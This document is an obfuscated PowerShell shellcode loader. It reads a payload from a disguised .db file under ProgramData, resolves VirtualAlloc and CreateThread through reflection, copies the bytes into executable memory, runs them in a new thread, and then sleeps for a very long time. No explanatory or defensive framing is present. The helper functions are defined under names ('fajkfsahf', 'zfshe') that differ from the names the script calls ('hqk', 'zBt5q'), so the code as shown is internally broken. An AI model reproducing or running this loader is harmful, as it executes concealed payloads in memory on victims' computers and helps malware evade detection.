[Byte[]]$nGScd = [IO.File]::ReadAllBytes('C:\Programdata\MDF1-C4A6-03AE-A001-7765.db');   

	function Local:fajkfsahf
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $A6LFy,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Jhbt9
        )
        $Vb789 = (([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'));
         Write-Output ($Vb789.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), (($Vb789.GetMethod('GetModuleHandle')).Invoke($null, @($A6LFy))))), $Jhbt9));
		
    }
	
	function Local:zfshe
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $fXk6 = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $MHzn = [Void]
        )
         $fSkum = ((([AppDomain]::CurrentDomain).DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)).DefineDynamicModule('InMemoryModule', $false)).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
        ($fSkum.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fXk6)).SetImplementationFlags('Runtime, Managed');
        ($fSkum.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $MHzn, $fXk6)).SetImplementationFlags('Runtime, Managed');
         Write-Output $fSkum.CreateType();
    }
	
        $yNRKp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hqk kernel32.dll VirtualAlloc), (zBt5q @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
        $Zq7d = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hqk kernel32.dll CreateThread), (zBt5q @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])));
		$UbK8Y = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hqk msvcrt.dll memset), (zBt5q @([IntPtr], [UInt32], [UInt32]) ([IntPtr])));
		$qRx6u = $yNRKp.Invoke(0,0x10000,0x1000,0x40);
		$nlY3e = 192;
		if ([IntPtr]::Size -eq 8) {$nlY3e = 13984;};
		[System.Runtime.InteropServices.Marshal]::Copy($nGScd, 0, $qRx6u, $nGScd.Length);	
		$qRx6u = $qRx6u.ToInt64() + $nlY3e;
		$Zq7d.Invoke(0,0,$qRx6u,$qRx6u,0,0);
		Start-Sleep -Seconds 90000;